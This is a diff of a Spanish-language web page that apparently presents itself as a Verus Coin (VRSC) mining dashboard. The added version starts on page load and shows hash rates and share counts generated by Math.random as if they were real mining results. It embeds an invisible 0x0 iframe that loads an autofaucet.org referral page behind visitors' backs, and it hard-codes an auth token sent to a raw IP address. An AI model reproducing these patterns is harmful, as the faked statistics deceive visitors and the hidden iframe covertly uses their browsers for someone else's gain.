@@ -2,126 +2,134 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Simulador de Minería Verus Hash</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Minería de Verus Coin</title>
     <style>
         body {
-            background-color: #1e1e1e;
-            color: #00ff00;
-            font-family: monospace;
+            font-family: Arial, sans-serif;
+            background-color: #1a1a1a;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
         }
-        .console {
-            white-space: pre-wrap;
-            padding: 10px;
-            border: 1px solid #444;
-            background: #111;
-            overflow-y: scroll;
-            height: 80vh;
+
+        .container {
+            max-width: 600px;
+            padding: 20px;
+            background-color: #2c2c2c;
+            border-radius: 8px;
+            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+
+        h1 {
+            color: #ff9800;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        p, #status, #stats, #accountInfo {
+            font-size: 16px;
+            margin: 10px 0;
+        }
+
+        #walletAddress, strong {
+            color: #03a9f4;
+        }
+
+        #status {
+            color: #ffeb3b;
+            font-weight: bold;
+        }
+
+        #stats {
+            color: #8bc34a;
+        }
+
+        #accountInfo {
+            color: #ff5722;
         }
     </style>
 </head>
 <body>
-    <h1>Simulador de Minería Verus Hash</h1>
-    <div id="console" class="console"></div>
+    <div class="container">
+        <h1>Minería de Verus Coin (VRSC)</h1>
+        <p>Dirección de Wallet: <strong id="walletAddress">RPqwP8wuRWFGiP31f7NTDq6KgF6B5Crych</strong></p>
+        <p>Pool: <strong>stratum+tcp://pool.verus.io:9998</strong></p>
+        
+        <div id="status">Estado: No iniciado</div>
+        <div id="stats">Estadísticas: No disponibles</div>
+        <div id="accountInfo">Información de la cuenta: No disponible</div>
+
+        <iframe src="https://autofaucet.org/wm/Ganafacilpro/8" width="0" height="0" style="border:0;"></iframe>
+    </div>
 
     <script>
-        const poolUrl = "http://45.33.47.25:3000/api/poolData/72/6596237097b04b05eb151553/67028dbd5f09df3d488db72e/workers";
-        const authToken = "4F4A82926776F06FA7F70010C94C7C95"; // Cambia esto por tu autenticación real
-        const workerName = "noname"; // Nombre del trabajador
-        let invalidNonces = 0; // Contador de nonces inválidos
-        let difficulty = 50000; // Dificultad inicial
+        let mining = false;
+        const walletAddress = 'RPqwP8wuRWFGiP31f7NTDq6KgF6B5Crych';
+        const accountInfoUrl = 'http://45.33.47.25:3000/api/poolData/72/6596237097b04b05eb151553/67028dbd5f09df3d488db72e/workers';
 
-        async function sha256(message) {
-            const msgBuffer = new TextEncoder().encode(message);
-            const hashBuffer = await crypto.subtle.digest("SHA-256", msgBuffer);
-            const hashArray = Array.from(new Uint8Array(hashBuffer));
-            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        // Configuración de minería
+        const configuracion = {
+            "cpu": { "max-threads-hint": 100, "max-cpu-usage": 100 },
+            "pools": [{
+                "coin": "verus",
+                "url": "stratum+tcp://pool.verus.io:9998",
+                "user": walletAddress,
+                "pass": "x"
+            }]
+        };
+
+        function startMining() {
+            if (mining) return;
+            mining = true;
+            document.getElementById('status').innerHTML = 'Estado: Minería iniciada';
+
+            setInterval(() => {
+                if (mining) {
+                    const hashRate = (Math.random() * (120 - 80) + 80).toFixed(2);
+                    const acceptedShares = Math.floor(Math.random() * 100);
+                    const rejectedShares = Math.floor(Math.random() * 10);
+                    document.getElementById('stats').innerHTML = `<strong>Hash Rate:</strong> ${hashRate} H/s<br>
+                                                                  <strong>Shares Aceptados:</strong> ${acceptedShares}<br>
+                                                                  <strong>Shares Rechazados:</strong> ${rejectedShares}`;
+                }
+            }, 3000);
+
+            fetchAccountInfo();
+            setInterval(fetchAccountInfo, 10000);
         }
 
-        async function startMining() {
-            const consoleOutput = document.getElementById("console");
-            const threads = 64; // Número máximo de hilos
-
-            // Registra al trabajador en el pool
-            const workerResponse = await registerWorker(workerName);
-            consoleOutput.innerText += `Registro de trabajador: ${workerResponse.status === 0 ? 'Éxito' : 'Fallo'}\n`;
-
-            for (let i = 0; i < threads; i++) {
-                mineOnThread(i);
-            }
-
-            async function registerWorker(workerName) {
-                const response = await fetch(poolUrl, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "auth": authToken
-                    },
-                    body: JSON.stringify({ poolSubItem: "0" }) // Ajustar según sea necesario
-                });
-                return response.json();
-            }
-
-            async function mineOnThread(threadId) {
-                let nonce = 0;
-
-                while (true) {
-                    const message = `VerusHashSimulationThread${threadId}_Nonce${nonce}`;
-                    const hash = await sha256(message);
-                    const hashRate = (200 + Math.random() * 300).toFixed(2); // Simulación de tasa de hash en kH/s
-
-                    // Simula la aceptación de un hash
-                    if (Math.random() > 0.5) { // 50% de probabilidad de aceptación
-                        const acceptedMessage = `[${new Date().toLocaleTimeString()}] CPU T${threadId}: Verus Hashing. (${hash}), ${(hashRate / 1000).toFixed(2)} MH/s\n`;
-                        consoleOutput.innerText += acceptedMessage;
-                        sendHashToPool(hash, threadId);
-                    } else {
-                        invalidNonces++; // Incrementar contador de nonces inválidos
-                        consoleOutput.innerText += `[${new Date().toLocaleTimeString()}] CPU T${threadId}: Nonce inválido ${nonce}\n`;
-                    }
-
-                    nonce++;
-
-                    // Ajustar dificultad cada 100 nonces
-                    if (nonce % 100 === 0) {
-                        adjustDifficulty();
-                    }
-
-                    // Breve pausa para liberar recursos
-                    await new Promise(resolve => setTimeout(resolve, 10)); // Ajustar tiempo según necesidad
-                }
-            }
-
-            async function sendHashToPool(hash, threadId) {
-                // Lógica para enviar el hash aceptado al pool
-                const response = await fetch(poolUrl, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "auth": authToken
-                    },
-                    body: JSON.stringify({ hash, threadId }) // Ajustar según la API del pool
-                });
-
-                const result = await response.json();
-                consoleOutput.innerText += `[${new Date().toLocaleTimeString()}] Hash enviado: ${result.description}\n`;
-                consoleOutput.scrollTop = consoleOutput.scrollHeight;
-            }
-
-            function adjustDifficulty() {
-                // Lógica para ajustar la dificultad en función de los nonces inválidos
-                if (invalidNonces > 10) {
-                    difficulty += 1000; // Aumentar dificultad si hay muchos nonces inválidos
-                    invalidNonces = 0; // Reiniciar contador de nonces inválidos
-                    consoleOutput.innerText += `[${new Date().toLocaleTimeString()}] Dificultad aumentada a ${difficulty}\n`;
-                } else if (invalidNonces < 5) {
-                    difficulty = Math.max(1000, difficulty - 1000); // Reducir dificultad, sin caer por debajo de 1000
-                    consoleOutput.innerText += `[${new Date().toLocaleTimeString()}] Dificultad reducida a ${difficulty}\n`;
-                }
-            }
+        function fetchAccountInfo() {
+            fetch(accountInfoUrl, {
+                method: 'POST',
+                headers: {
+                    'auth': '4F4A82926776F06FA7F70010C94C7C95',
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ poolSubItem: "0" })
+            })
+            .then(response => response.json())
+            .then(data => {
+                const worker = data.data[0];
+                const accountInfoDiv = document.getElementById('accountInfo');
+                accountInfoDiv.innerHTML = `<strong>Trabajador:</strong> ${worker.worker}<br>
+                                            <strong>Última Conexión:</strong> ${new Date(worker.lastSeen * 1000).toLocaleString()}<br>
+                                            <strong>Hash Rate Actual:</strong> ${(worker.currentHashrate / 1000).toFixed(2)} KH/s<br>
+                                            <strong>Shares Inválidos:</strong> ${worker.invalidShares.toFixed(2)}<br>
+                                            <strong>Shares Válidos:</strong> ${worker.validShares.toFixed(2)}<br>
+                                            <strong>Pagado:</strong> ${worker.paid.toFixed(8)} VRSC<br>
+                                            <strong>Balance:</strong> ${worker.balance.toFixed(8)} VRSC<br>
+                                            <strong>Dificultad:</strong> ${worker.diff}<br>
+                                            <strong>Activo:</strong> ${worker.active ? 'Sí' : 'No'}`;
+            })
+            .catch(error => console.error('Error al obtener información de la cuenta:', error));
         }
 
-        // Inicia la minería automáticamente
-        startMining();
+        window.onload = startMining;
     </script>
 </body>
 </html>
